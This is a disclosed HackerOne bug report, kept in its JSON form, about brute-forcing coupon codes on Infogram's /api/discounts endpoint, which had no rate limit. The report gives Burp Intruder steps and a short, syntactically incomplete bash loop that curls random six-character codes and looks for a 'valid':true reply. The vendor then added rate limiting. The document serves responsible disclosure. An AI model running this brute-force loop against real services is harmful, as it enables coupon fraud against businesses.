{"id":288846,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODg4NDY=","url":"https://hackerone.com/reports/288846","title":"Bruteforcing Coupons","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-11-09T15:57:10.803Z","submitted_at":"2017-11-09T15:57:10.803Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"t-pwn","url":"/t-pwn","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/beSrUdM5a9NfVE85FkwjQEPD/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":21745,"url":"https://hackerone.com/infogram","handle":"infogram","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Infogram","twitter_handle":"infogram","website":"http://infogram.com","about":"Make Infographics and Charts that People Love"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-12-12T19:48:01.100Z","bug_reporter_agreed_on_going_public_at":"2017-12-12T17:23:37.471Z","team_member_agreed_on_going_public_at":"2017-12-12T19:48:01.031Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nwhile i was fuzzing for an API endpoints i found this endpoint: https://infogram.com/api/discounts\nthe first thing came on my mind is bruteforcing the coupon codes so i gave it a try and it worked!\nthere's no rate limit on that endpoint so an attacker could use it to bruteforce the coupon codes and filter the results to snipe the \"valid\":true response\n\n##Steps to reproduce:\n\n+ intercept the request using burpsuite or any proxy tool you would like to use\n\n+ send the request to the intruder\n\n+ configure the payload position\n\n     {F238091}\n\n+ start the attack\n\ni wrote a simple script in bash to do the operation\n\n```\n\n#!/bin/bash\n\nwhile [ 1 ]\ndo\n\n  coupon=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 6 | head -n 1)\n  curl=$(curl -i -s -k  -X $'GET' \\\n    -H $'X-Requested-With: XMLHttpRequest' \\\n    -b $'Cookies:XXXXXXX' \\\n    $'https://infogram.com/api/discounts/$coupon')\n\n  if [[ $curl == *\"valid\":true* ]]\n    echo \"$coupon is valid\";\n  else\n    echo \"$coupon is invalid\";\n  \nbreak;\n\n```\n\nThanks.","original_report_id":null,"original_report_url":null,"attachments":[{"id":238091,"file_name":"Screenshot_from_2017-11-09_10-28-27.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/238/091/0648845be6ef99c4f4ade7764047c4f75353ee56/Screenshot_from_2017-11-09_10-28-27.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2017-11-09_10-28-27.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2017-11-09_10-28-27.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143858Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=dc2c0442f0e984d4dc479391d9b796fce061f1ed2838f8b976af6e17c6ce14db","file_size":70728,"type":"image/png"}],"allow_singular_disclosure_at":"2018-01-11T17:23:37.546Z","allow_singular_disclosure_after":-118271720.53928258,"singular_disclosure_allowed":true,"vote_count":3,"voters":["eveeez","r3y","japz"],"structured_scope":{"databaseId":870,"asset_type":"URL","asset_identifier":"infogram.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2156303,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ping","automated_response":false,"created_at":"2017-11-14T12:11:55.733Z","updated_at":"2017-11-14T12:11:55.733Z","actor":{"username":"t-pwn","cleared":false,"url":"/t-pwn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/beSrUdM5a9NfVE85FkwjQEPD/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2173326,"is_internal":false,"editable":false,"type":"Activities::HackerRequestedMediation","message":"It’s been 12 days and I’m getting no reply?","automated_response":false,"created_at":"2017-11-21T16:54:06.976Z","updated_at":"2017-11-21T16:54:06.976Z","actor":{"username":"t-pwn","cleared":false,"url":"/t-pwn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/beSrUdM5a9NfVE85FkwjQEPD/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2199187,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2017-12-04T16:41:05.597Z","updated_at":"2017-12-04T16:41:05.597Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2206172,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2017-12-07T09:19:22.612Z","updated_at":"2017-12-07T09:19:22.612Z","additional_data":{"duplicate_report_id":295898},"actor":{"username":"muon4","cleared":true,"url":"/muon4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2217371,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks. Rate limitation has been set up for this endpoint.\n\nBest regards,\nKaspars","automated_response":false,"created_at":"2017-12-12T15:26:57.287Z","updated_at":"2017-12-12T15:26:57.287Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"t-pwn","url":"/t-pwn"},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2217769,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-12-12T17:23:37.496Z","updated_at":"2017-12-12T17:23:37.496Z","first_to_agree":true,"actor":{"username":"t-pwn","cleared":false,"url":"/t-pwn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/beSrUdM5a9NfVE85FkwjQEPD/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2218221,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-12-12T19:48:01.055Z","updated_at":"2017-12-12T19:48:01.055Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2218222,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-12-12T19:48:01.123Z","updated_at":"2017-12-12T19:48:01.123Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}